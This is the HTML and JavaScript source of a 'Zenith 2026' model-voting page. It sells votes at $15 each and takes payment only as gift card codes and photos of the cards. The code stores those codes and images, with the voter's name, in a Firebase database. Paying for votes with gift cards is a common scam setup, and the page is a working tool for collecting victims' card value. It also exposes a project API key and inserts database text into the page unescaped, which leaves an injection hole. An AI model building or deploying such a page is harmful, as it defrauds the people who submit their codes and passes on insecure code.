<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zenith 2026 Vote</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#0a0a0a;color:#fff}
.header{background:#000;padding:12px;text-align:center;position:sticky;top:0;z-index:10}
.header h1{font-size:20px;letter-spacing:2px}
.slideshow{position:relative;width:100%;height:260px;overflow:hidden;background:#111}
.slideshow img{position:absolute;width:100%;height:100%;object-fit:cover;opacity:0;transition:opacity 0.8s}
.slideshow img.active{opacity:1}
.vote-info{text-align:center;padding:15px;background:#111}
.vote-info h2{color:#FFD700}
.models{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px}
.model-card{background:#1a1a1a;border-radius:12px;overflow:hidden;padding-bottom:10px}
.model-card img{width:100%;height:180px;object-fit:cover}
.model-card h3{padding:8px;text-align:center;font-size:15px}
.model-card button{width:90%;margin:5px 5%;padding:10px;background:#FFD700;color:#000;border:none;border-radius:20px;font-weight:bold;cursor:pointer}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:100;align-items:center;justify-content:center;padding:15px}
.modal.active{display:flex}
.modal-box{background:#222;width:100%;max-width:380px;border-radius:15px;padding:20px}
.modal-box h3{text-align:center;margin-bottom:10px}
.modal-box input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;background:#333;color:#fff}
.modal-box label{font-size:13px;color:#aaa;margin-top:8px;display:block}
.modal-box button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:8px;font-weight:bold;cursor:pointer}
.btn-gold{background:#FFD700;color:#000}
.btn-close{background:#444;color:#fff}
.support{position:fixed;bottom:15px;right:15px;background:#FFD700;color:#000;padding:10px 15px;border-radius:25px;text-decoration:none;font-weight:bold;font-size:13px;z-index:20}
#loading{text-align:center;padding:40px;color:#888}
</style>
</head>
<body>
<div class="header"><h1>ZENITH 2026</h1></div>
<div class="slideshow" id="slideshow"></div>
<div class="vote-info"><h2>$15 Per Vote</h2><p>Vote for your favorite model</p></div>
<div id="loading">Loading models...</div>
<div class="models" id="models"></div>
<a class="support" href="mailto:support@zenith2026.com?subject=Support Request">📧 Email Support</a>

<div class="modal" id="voteModal">
<div class="modal-box">
<h3 id="voteTitle">Vote</h3>
<input type="text" id="voterName" placeholder="Your Name">
<input type="number" id="voteCount" placeholder="Number of votes" value="1" min="1" oninput="calcTotal()">
<p style="text-align:center;margin:8px 0">Total: $<span id="totalPrice">15</span></p>
<label>Gift Card Code</label>
<input type="text" id="giftCode" placeholder="Enter gift card code">
<label>Gift Card Image (Upload)</label>
<input type="file" id="giftImage" accept="image/*">
<button class="btn-gold" onclick="submitVote()">Submit Vote</button>
<button class="btn-close" onclick="closeModal()">Cancel</button>
<p id="voteStatus" style="text-align:center;margin-top:10px;color:#FFD700"></p>
</div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, onValue, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCah_ucdI55pyBR_RJ_ILu26aSALI1rVbA",
  authDomain: "zenith-2026-vote.firebaseapp.com",
  databaseURL: "https://zenith-2026-vote-default-rtdb.firebaseio.com",
  projectId: "zenith-2026-vote",
  storageBucket: "zenith-2026-vote.firebasestorage.app",
  messagingSenderId: "534661022606",
  appId: "1:534661022606:web:31af138277cf4e88ce9adf",
  measurementId: "G-ZTNEHT3KEX"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let selectedModel = null;
let slideIndex = 0;
let slideInterval;

function renderModels(data){
  const container = document.getElementById('models');
  const loading = document.getElementById('loading');
  const slideshow = document.getElementById('slideshow');
  container.innerHTML = '';
  slideshow.innerHTML = '';
  loading.style.display='none';
  const models = data ? Object.entries(data).map(([id, m])=>({id,...m})) : [];
  if(models.length===0){loading.style.display='block';loading.textContent='No models yet';return;}
  models.forEach((m,i)=>{
    const img=document.createElement('img');
    img.src=m.mainImage||m.image;
    if(i===0) img.classList.add('active');
    slideshow.appendChild(img);
  });
  startSlideshow();
  models.forEach(m=>{
    const card=document.createElement('div');
    card.className='model-card';
    card.innerHTML=`<img src="${m.mainImage||m.image}"><h3>${m.name}</h3><p style="text-align:center;font-size:12px;color:#aaa">${m.votes||0} votes</p><button onclick="openVote('${m.id}','${m.name.replace(/'/g,"\\'")}')">VOTE - $15</button>`;
    container.appendChild(card);
  });
}
function startSlideshow(){
  const imgs=document.querySelectorAll('#slideshow img');
  if(slideInterval) clearInterval(slideInterval);
  slideIndex=0;
  slideInterval=setInterval(()=>{
    imgs[slideIndex]?.classList.remove('active');
    slideIndex=(slideIndex+1)%imgs.length;
    imgs[slideIndex]?.classList.add('active');
  },3000);
}
onValue(ref(db,'models'), (snap)=>{ renderModels(snap.val()); });

window.openVote=(id,name)=>{
  selectedModel=id;
  document.getElementById('voteTitle').textContent='Vote for '+name;
  document.getElementById('voteModal').classList.add('active');
  calcTotal();
}
window.closeModal=()=>{document.getElementById('voteModal').classList.remove('active');}
window.calcTotal=()=>{
  const c=parseInt(document.getElementById('voteCount').value)||1;
  document.getElementById('totalPrice').textContent=c*15;
}
window.submitVote=async()=>{
  const voterName=document.getElementById('voterName').value.trim();
  const voteCount=parseInt(document.getElementById('voteCount').value)||1;
  const giftCode=document.getElementById('giftCode').value.trim();
  const giftFile=document.getElementById('giftImage').files[0];
  const status=document.getElementById('voteStatus');
  if(!voterName||!giftCode||!giftFile){status.textContent='Fill name, gift code and image';return;}
  status.textContent='Submitting...';
  const reader=new FileReader();
  reader.onload=async(e)=>{
    const giftImageBase64=e.target.result;
    try{
      await push(ref(db,'votes'),{modelId:selectedModel,voterName,voteCount,giftCode,giftImage:giftImageBase64,total:voteCount*15,timestamp:Date.now()});
      status.textContent='Vote submitted! Awaiting verification.';
      setTimeout(closeModal,2000);
    }catch(err){status.textContent='Error: '+err.message;}
  };
  reader.readAsDataURL(giftFile);
}
</script>
</body>
</html>
